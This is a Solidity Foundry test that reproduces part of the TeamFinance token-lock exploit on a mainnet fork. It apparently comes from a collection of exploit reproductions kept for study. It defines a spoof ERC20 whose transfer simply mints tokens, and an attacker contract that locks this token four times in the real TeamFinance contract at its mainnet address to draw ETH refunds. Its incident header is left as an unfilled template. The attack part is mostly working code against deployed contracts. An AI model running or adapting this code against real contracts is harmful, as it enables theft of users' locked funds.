// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {TestHarness} from "../../TestHarness.sol";
import {TokenBalanceTracker} from '../../modules/TokenBalanceTracker.sol';
import {IERC20} from "../../interfaces/IERC20.sol";
import {IWETH9} from '../../interfaces/IWETH9.sol';
import {IUniswapV2Pair} from "../../utils/IUniswapV2Pair.sol";

// forge test --match-contract Exploit_PROTOCOL_NAME -vvv
/*
On DATE an attacker stole AMOUNT in TYPE tokens from an PROTOCOL.


// Attack Overview
Total Lost: 
Locking Tokens Tx: 0xe8f17ee00906cd0cfb61671937f11bd3d26cdc47c1534fedc43163a7e89edc6f
Attack Tx

Ethereum Transaction Viewer:
- Lock: https://openchain.xyz/trace/ethereum/0xe8f17ee00906cd0cfb61671937f11bd3d26cdc47c1534fedc43163a7e89edc6f
- Attack: 

Exploited Contract: 
Attacker Address: 
Attacker Contract: 
Malicious Token: 0x2d4ABfDcD1385951DF4317f9F3463fB11b9A31DF
Attack Block:  

// Key Info Sources
Twitter: 
Writeup: 
Article: 
Code: 


Principle: VULN PRINCIPLE


ATTACK:
1)

MITIGATIONS:
1)

*/

contract SpoofERC20 {

    string constant name = '';
    uint256 constant decimals = 18;
    string constant symbol = '';

    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;
    uint256 public totalSupply;

    event Approval(address, address, uint256);
    event Transfer(address, address, uint256);

    function approve(address spender, uint256 amount) public {
        require(spender != address(0));

        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
    }

    function transfer(address to, uint256 amount) public {
        require(to != address(0));
        require(balanceOf[to] <= ~ amount);

        balanceOf[to] += amount; // Essentially, mints tokens. 

        emit Transfer(msg.sender, to, amount);
    }

    function transferFrom(address from, address to, uint256 amount) public {
        require(to != address(0));
        require(balanceOf[to] <= ~ amount);

        balanceOf[to] += amount;

        emit Transfer(from, to, amount);
    }
}

interface ITeamFinanceLock {
    function lockToken(address _tokenAddress, address _withdrawalAddress, uint256 _amount, uint256 _unlockTime, bool _mintNFT) external payable returns (uint256 _id);
    function getFeesInETH(address _tokenAddress) external returns (uint256);
}

contract Exploit_TeamFinance is TestHarness, TokenBalanceTracker {
    ITeamFinanceLock internal teamFinanceLock = ITeamFinanceLock(0xE2fE530C047f2d85298b07D9333C05737f1435fB);
    address internal lockTokenImplementation = 0x48D118C9185e4dBAFE7f3813F8F29EC8a6248359;

    SpoofERC20 internal maliciousToken;
    address internal attackerAddress_Two = address(0x912);

    bool internal afterCallingLockToken;
    uint256[] internal tokenIds;

    uint256 internal constant LOCKED_AMOUNT = 1000000000;
    uint256 internal constant TRANSFER_AMOUNT = LOCKED_AMOUNT * 10e28;
    function setUp() external {
        cheat.createSelectFork("mainnet", 15837165); 
        cheat.deal(address(this), 0.5 ether);

        maliciousToken = new SpoofERC20();
    }

    function test_Lock() external {
        this.lockAndTransfer{value: 0.5 ether}();
    }

    function lockAndTransfer() external payable {
        // Locks four times.
        for(uint256 i = 0; i < 4; ) {
            // First step differs from the others. 
            if(i == 0) {
                _lockTokenInTeam(msg.value);
                maliciousToken.transfer(lockTokenImplementation, TRANSFER_AMOUNT); // Malicious token supply manipulation.
            } else {
                _lockTokenInTeam(address(this).balance);
            }
            unchecked {
                ++i;
            }
        }
    }

    function _lockTokenInTeam(uint256 _value) internal {
        afterCallingLockToken = true;
        uint256 tokenFees = teamFinanceLock.getFeesInETH(address(maliciousToken));
        require(_value > tokenFees, 'Send enough ETH for fees');

        // Passing block.timestamp reverts with 'Invalid unlock time'. 
        // The attacker passed block.timestamp + 5.
        uint256 tokenId = teamFinanceLock.lockToken{value: _value}(address(maliciousToken), address(this), LOCKED_AMOUNT, block.timestamp + 5, false);
        tokenIds.push(tokenId);
        
        afterCallingLockToken = false;
    }

    receive() external payable {
        if(afterCallingLockToken){
            console.log('Received %s ETH refund after locking token', address(this).balance);
        }
    }

}

